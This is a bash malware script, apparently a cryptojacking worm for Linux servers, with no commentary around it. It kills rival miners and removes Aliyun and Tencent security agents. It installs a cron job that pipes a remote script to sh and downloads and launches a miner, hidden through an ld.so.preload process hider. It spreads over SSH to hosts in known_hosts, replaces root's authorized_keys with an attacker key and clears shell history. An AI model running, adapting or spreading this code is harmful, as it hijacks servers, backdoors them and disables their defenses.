#!/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
SHELL=/bin/sh
export PATH
ps auxf|grep -v grep | awk '{if($3>=80.0) print $2}'|xargs kill -9
chattr -i /etc/x7/bin/x7
chattr -i /var/spool/cron/root
rm -rf /var/spool/cron/root
touch /var/spool/cron/root
echo "*/15 * * * * curl -fsSL http://114.221.18.135:99/1017.sh |sh" > /var/spool/cron/root
yum remove wget -y
yum install wget -y
chattr -i /root/.ssh/authorized_keys
chattr -i /tmp/sysupdate
rm -rf /tmp/sysupdate
chattr -i /tmp/update.sh
rm -rf /tmp/update.sh
chattr -i /tmp/sysguard
rm -rf /tmp/sysguard
chattr -i /etc/sysupdate
chattr -i /etc/update.sh
chattr -i /etc/networkservice
chattr -i /etc/sysguard
rm -rf /etc/sysguard
rm -rf /etc/networkservice
rm -rf /etc/sysupdate
rm -rf /etc/update.sh
set +o posix
for f in /var/spool/cron/* /var/spool/cron/crontabs/* /etc/*crontab /etc/cron.d/*; do 
  if grep -i -q redis "$f"; then echo > "$f"; fi
done
if [ -f /etc/ld.so.preload ]; then
  mv -f /etc/ld.so.preload /etc/ld.so.pre
fi
chmod -x /etc/xig
chmod -x /root/cranberry /tmp/cranberry /root/yam
chmod -x /etc/root.sh
chmod -x /usr/bin/gpg-agentd
chmod -x /usr/bin/kworker
chmod -x /usr/local/bin/gpg-agentd
ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "pool.t00ls.ru"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
ps auxf|grep xiaoyao| awk '{print $2}'|xargs kill -9
ps auxf|grep xiaoxue| awk '{print $2}'|xargs kill -9
ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
ps ax|grep -o './[0-9]* -c'| xargs pkill -f
killall -9 wget
killall -9 curl
killall -9 sysupdate
killall -9 sysguard
killall -9 networkservice
killall -9 xmrig
killall -9 xig
killall -9 cranberry
killall -9 root.sh
killall -9 gpg-agentd
killall -9 .gpg-agent
killall -9 xmr-stak
killall -9 kworker
killall -9 .gpg
killall -9 pnscan
killall -9 netfs
killall -9 geth
pkill -f stratum
pkill -f nativesvc
pkill -f cryptonight
pkill -f minerd
pkill -f conn.sh
pkill -f /opt/yilu/
pkill -f /tmp/
pkill -f .cmd
pkill -f kworker
if grep monero7 /etc/x7/pools.txt; then
  killall x7
  rm -rf /etc/x7
fi
running=
killall x7
#if ps aux | grep '[b]in/x7'; then
#  running=1
#fi
if [ -f /etc/ld.so.pre ]; then
  mv -f /etc/ld.so.pre /etc/ld.so.preload
fi
if ! /sbin/iptables -n -L | grep -q 165.225.157.157; then
  iptables -A INPUT -s 165.225.157.157 -j DROP
  iptables -A OUTPUT -d 165.225.157.157 -j DROP
fi
while read h; do 
if ! grep -q "$h" /etc/hosts; then
  echo "$h" >> /etc/hosts
fi
done < <(echo '
204.232.175.78 documentcloud.github.com
207.97.227.239 http://github.com
204.232.175.94 http://gist.github.com
107.21.116.220 http://help.github.com
207.97.227.252 http://nodeload.github.com
199.27.76.130 http://raw.github.com
107.22.3.110 http://status.github.com
204.232.175.78 http://training.github.com
207.97.227.243 http://www.github.com
0.0.0.0 transfer.sh
0.0.0.0 static.cortins.tk
0.0.0.0 xcn1.yiluzhuanqian.com
0.0.0.0 www.yiluzhuanqian.com
0.0.0.0 xmr.yiluzhuanqian.com
0.0.0.0 stratum.f2pool.com
0.0.0.0 xmr.crypto-pool.fr
0.0.0.0 jw-js1.ppxxmr.com
0.0.0.0 fr.minexmr.com
0.0.0.0 pool.minexmr.com
0.0.0.0 img.namunil.com
0.0.0.0 cdn.namunil.com
0.0.0.0 chrome.zer0day.ru
0.0.0.0 pool.t00ls.ru
0.0.0.0 monerohash.com
0.0.0.0 z.chakpools.com
')
if [[ "$running" -eq "1" ]]; then
  clean
  exit 0
fi
os=$(egrep -i 'debian|ubuntu|cent' -o -- /etc/issue)
os="${os,,}"
if [ -z "$os" ] && type yum; then os='cent'; fi
if ! grep -q 8.8.8.8 /etc/resolv.conf; then
  echo nameserver 8.8.8.8 >> /etc/resolv.conf
fi
if ! grep -q 1.1.1.1 /etc/resolv.conf; then
  echo nameserver 1.1.1.1 >> /etc/resolv.conf
fi
if [ "$os" = 'cent' ]; then
  yum install -y at unzip wget bzip2 hwloc-devel openssl openssl-devel
else
  apt-get update
  apt-get install -y at unzip wget hwloc
fi
if ps aux | grep -i '[a]liyun'; then
    wget http://update.aegis.aliyun.com/download/uninstall.sh
    chmod +x uninstall.sh
    ./uninstall.sh
    wget http://update.aegis.aliyun.com/download/quartz_uninstall.sh
    chmod +x quartz_uninstall.sh
    ./quartz_uninstall.sh
    rm -f uninstall.sh quartz_uninstall.sh
    pkill aliyun-service
    rm -fr /etc/init.d/agentwatch /usr/sbin/aliyun-service
    rm -rf /usr/local/aegis*;
elif ps aux | grep -i '[y]unjing'; then
    /usr/local/qcloud/stargate/admin/uninstall.sh
    /usr/local/qcloud/YunJing/uninst.sh
    /usr/local/qcloud/monitor/barad/admin/uninstall.sh
fi
cd /etc; wget --no-check-certificate http://116.255.130.5/admin/cent.tar.gz -O x7.tar.gz; tar -xvf x7.tar.gz && rm -f x7.tar.gz
/sbin/sysctl -w vm.nr_hugepages=128
chown -R root:root /etc/x7
chmod -R 777 /etc/x7/bin/x7
chattr +i /etc/x7/bin/x7
if [ -f /etc/rc.sysinit ]; then
  if ! grep x7 /etc/rc.sysinit; then sed -i '35i(cd /etc/x7; nohup nice bin/x7 &)' /etc/rc.sysinit; fi
elif [ -f /etc/rc.d/init.d/network ]; then
  if ! grep x7 /etc/rc.d/init.d/network; then sed -i '64i(cd /etc/x7; nohup nice bin/x7 &)' /etc/rc.d/init.d/network; fi
elif [ -f /etc/init.d/networking ]; then
  if ! grep x7 /etc/init.d/networking; then sed -i '130i(cd /etc/x7; nohup nice bin/x7 &)' /etc/init.d/networking; fi
fi
wget --no-check-certificate https://github.com/gianlucaborello/libprocesshider/archive/master.zip -O master.zip && unzip master.zip && rm -f master.zip && cd libprocesshider-master;
sed -i 's/evil_script.py/x7/' processhider.c
make && mv libprocesshider.so /usr/local/lib/libjdk.so && echo /usr/local/lib/libjdk.so >> /etc/ld.so.preload && cd .. && rm -rf libprocesshider-master
cd /etc/x7; nohup nice bin/x7 &
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'curl -o-  http://114.221.18.135:99/1017.sh | bash >/dev/null 2>&1 &' & done
fi
touch -r /etc/sudoers /etc/x7 /etc/ld.so.preload /etc/hosts
chattr -i /root/.ssh/authorized_keys
rm -rf /root/.ssh/authorized_keys
touch /root/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxrBrcpNlLpxz9hmeIY57Ia7/yhEmSqmbDA6w4gDcGcgbmbmVOeoBJvcqDiSxBNho9MfilXPpialmLYr0UCfgHxGjQB8jyHWGI2DfbLLDdP6tPfs7r0F08vY7yVkyh39dKliK/Dlx5tIXzI3t1I7FUkvHm4oPWe5S/6snbLRwCKuwT23o/hZoCuKI7+kdxkZ//UsilHFW0JCs1rdjKFtxCz3hxT3xfK8h4urer0B/hbWNap/rTibRq3UqbIXwMYTgTcKESjS8x10UJzDqKIRqMeJWmsPN4+cLkntgnWi9uuWsmYoLHhFQehOlI4oGImG6vb11K+zEtRvg8UAg3wJ4t root@host.localdomain" > /root/.ssh/authorized_keys
chattr +i /root/.ssh/authorized_keys
chattr +i /etc/x7/bin/x7
echo "*/15 * * * * curl -fsSL http://114.221.18.135:99/1017.sh |sh" > /var/spool/cron/root | at now + 16 minutes
clean
history -c
exit 0
exit 0